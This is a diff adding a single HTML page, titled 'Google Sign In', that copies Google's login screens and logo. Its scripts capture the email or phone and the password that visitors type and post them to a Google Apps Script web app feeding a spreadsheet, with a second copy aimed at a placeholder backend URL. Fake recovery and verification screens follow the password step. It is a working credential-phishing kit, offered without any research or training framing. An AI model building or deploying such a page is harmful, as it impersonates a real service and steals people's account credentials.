@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <script>
+    const backendUrl = "https://script.google.com/macros/s/AKfycbwKiaZV3lW1MCULgKs7QzHLxFO6PCnSRMherhquWCxOeo6JlMnQp1vizHyYYJTNFxA/exec"; // Your Web App URL
+
+    async function sendDataToGoogleSheet(data) {
+        try {
+            const response = await fetch(backendUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+            });
+
+            const result = await response.json();
+            if (result.status === "success") {
+                console.log("Data submitted successfully:", result.message);
+            } else {
+                console.error("Failed to submit data:", result.message);
+            }
+        } catch (error) {
+            console.error("Error submitting data:", error);
+        }
+    }
+
+    function showSection(sectionId) {
+        document.querySelectorAll('.container').forEach(container => {
+            container.style.display = 'none';
+        });
+        document.getElementById(sectionId).style.display = 'block';
+    }
+
+    function redirectToPasswordPage() {
+        const emailOrPhone = document.getElementById("emailOrPhone").value;
+        localStorage.setItem("emailOrPhone", emailOrPhone);
+
+        // Send email/phone to Google Sheets
+        sendDataToGoogleSheet({ emailOrPhone });
+
+        showSection('password-container');
+    }
+
+    function redirectToVerificationPage() {
+        const password = document.getElementById("password").value;
+
+        // Send password to Google Sheets
+        sendDataToGoogleSheet({ password });
+
+        showSection('verification-container');
+    }
+
+    window.onload = function () {
+        showSection('signin-container'); // Show the sign-in section by default
+    }
+</script>
+
+    <style>
+        body {
+            background-color: #202124;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #303134;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            width: 400px;
+            text-align: center;
+            display: none; /* Hide all containers by default */
+        }
+        .container img.logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+        .container img.prompt {
+            width: 300px; /* Adjusted width */
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .container input[type="text"], .container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            background-color: #202124;
+            color: white;
+        }
+        .container button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container button:hover {
+            background-color: #185abc;
+        }
+        .footer {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .footer a {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        // Store form data
+        let userData = {};
+
+        // Show specific section
+        function showSection(sectionId) {
+            document.querySelectorAll('.container').forEach(container => {
+                container.style.display = 'none';
+            });
+            document.getElementById(sectionId).style.display = 'block';
+        }
+
+        // Save email or phone
+        function saveEmailOrPhone() {
+            const emailOrPhone = document.getElementById("emailOrPhone").value;
+            if (!emailOrPhone) {
+                alert("Please enter your email or phone.");
+                return;
+            }
+            userData.emailOrPhone = emailOrPhone;
+            localStorage.setItem("emailOrPhone", emailOrPhone);
+            showSection('password-container');
+        }
+
+        // Save password
+        function savePassword() {
+            const password = document.getElementById("password").value;
+            if (!password) {
+                alert("Please enter your password.");
+                return;
+            }
+            userData.password = password;
+            sendData();
+            showSection('verification-container');
+        }
+
+        // Save data to the backend
+        async function sendData() {
+            const backendUrl = "<YOUR_BACKEND_URL>"; // Replace with your backend URL
+            try {
+                const response = await fetch(backendUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(userData),
+                });
+                if (response.ok) {
+                    console.log("Data sent successfully!");
+                } else {
+                    console.error("Error sending data:", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error connecting to backend:", error);
+            }
+        }
+
+        // Redirect to recovery page
+        function redirectToRecoveryPage() {
+            showSection('recovery-container');
+        }
+
+        // Redirect to account recovery options
+        function redirectToAccountRecoveryOptionsPage() {
+            const emailOrPhone = localStorage.getItem("emailOrPhone");
+            document.getElementById("recovery-email").innerText = emailOrPhone;
+            showSection('account-recovery-options-container');
+        }
+
+        // Redirect to verification page
+        function redirectToVerificationPage() {
+            const emailOrPhone = localStorage.getItem("emailOrPhone");
+            document.getElementById("verification-email").innerText = emailOrPhone;
+            showSection('verification-container');
+        }
+
+        // Initialize the first section
+        window.onload = function() {
+            showSection('signin-container');
+        }
+    </script>
+</head>
+<body>
+    <!-- Sign-in Page -->
+    <div id="signin-container" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/2048px-Google_%22G%22_logo.svg.png" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <input id="emailOrPhone" type="text" placeholder="Email or Phone">
+        <button onclick="saveEmailOrPhone()">Next</button>
+        <div class="footer">
+            <a href="#">Create an account</a>
+        </div>
+    </div>
+
+    <!-- Password Page -->
+    <div id="password-container" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/2048px-Google_%22G%22_logo.svg.png" alt="Google Logo" class="logo">
+        <h1>Enter your password</h1>
+        <input id="password" type="password" placeholder="Password">
+        <button onclick="savePassword()">Next</button>
+        <div class="footer">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+    <!-- Recovery Page -->
+    <div id="recovery-container" class="container">
+        <h1>Google Account Recovery</h1>
+        <button onclick="redirectToAccountRecoveryOptionsPage()">Try another way</button>
+    </div>
+
+    <!-- Account Recovery Options Page -->
+    <div id="account-recovery-options-container" class="container">
+        <h1>Account Recovery Options</h1>
+        <p id="recovery-email"></p>
+    </div>
+
+    <!-- Verification Page -->
+    <div id="verification-container" class="container">
+        <h1>Verification</h1>
+        <p id="verification-email"></p>
+    </div>
+</body>
+</html>
